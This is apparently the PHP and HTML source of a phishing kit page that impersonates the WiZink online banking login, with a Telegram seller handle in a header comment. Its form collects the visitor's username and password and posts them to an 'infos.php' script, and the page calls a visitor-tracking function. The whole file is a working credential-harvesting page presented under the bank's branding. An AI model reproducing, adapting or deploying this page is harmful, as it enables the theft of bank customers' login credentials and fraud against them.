<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

visitors();


?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Acceso online al banco online de WiZink, banco de crédito y ahorro.</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/fav.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/fav.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
  <div class="body">
    <div class="img d-none d-lg-block"><img src="image/point.png"></div>
    <div class="logo text-center mb-5"><img src="image/logo.png"></div>
    <div class="section row">
      <div class="form col-md-6">
        <h3 class="text-center">Aceda ao WiZink Online</h3>
       <form action="infos.php" method="post">
         <input type="hidden" value="index" name="step">
          <div class="form-group" style="position:relative;">
              <input type="text" class="form-control" id="user" name="user">
              <label class="lbl_user" for="user">TU USUARIO</label>
            </div>
            <div class="form-group" style="position:relative;">
              <input style="border-top:none;" type="password" class="form-control" id="password" name="password">
              <label class="lbl_password" for="password">TU CONTRASEÑA</label>
            </div>
            <div class="radio d-flex align-items-start" style="line-height: 20px;margin-top: 15px;">
              <div class="me-2"><img src="image/radio.png"></div>
              <div>Recordar mi nombre de usuario en este dispositivo</div>
            </div>
            <div class="bttn"><button name="submit">ENTRAR</button></div>
       </form>
        <div class="slash d-block d-md-flex justify-content-between mt-3">
          <div class="mt-2"><i class="fas fa-long-arrow-alt-right"></i> He olvidado mi usuario</div>
          <div class="mt-2"><i class="fas fa-long-arrow-alt-right"></i> mi contraseña</div>
        </div>
      </div>
      <div class="form col-md-6 text-center" style="background:transparent;padding: 40px;">
        <h3 style="color:#000;" class="text-center">¿Todavía no estás registrado en WiZink Online?</h3>
        <div class="cont">
          <p>Regístrate de forma rápida y sencilla, activa tu tarjeta y accede a todas las funcionalidades de WiZink Online.</p>
          <p>¿Tu tarjeta ya está activa? Así que simplemente regístrese y comience a administrar su cuenta de tarjeta.</p>
        </div>
        <div class="bttn"><button style="border:2px solid #091129;">REGÍSTRATE AHORA</button></div>
      </div>
    </div>
  </div>
  <div class="footer pt-1">
    <div class="f d-flex align-items-center justify-content-between">
      <div><span>© 2023 WiZink</span></div>
      <div>
        <ul class="list-unstyled d-flex mb-0">
          <li>CONTACTO </li>
          <li>INFORMACIÓN LEGAL</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
    $("#user").keyup(function(){
      if ($(this).val().length > 0) {
        $(".lbl_user").css({"font-size":"16px" , "top":"10px" , "color":"#00c7c5"})
      }
      else{
        $(".lbl_user").css({"font-size":"18px" , "top":"32px" , "color":"#6e7586"})
      }
    });

    $("#password").keyup(function(){
      if ($(this).val().length > 0) {
        $(".lbl_password").css({"font-size":"16px" , "top":"10px" , "color":"#00c7c5"})
      }
      else{
        $(".lbl_password").css({"font-size":"18px" , "top":"32px" , "color":"#6e7586"})
      }
    })

  </script>
</body>
</html>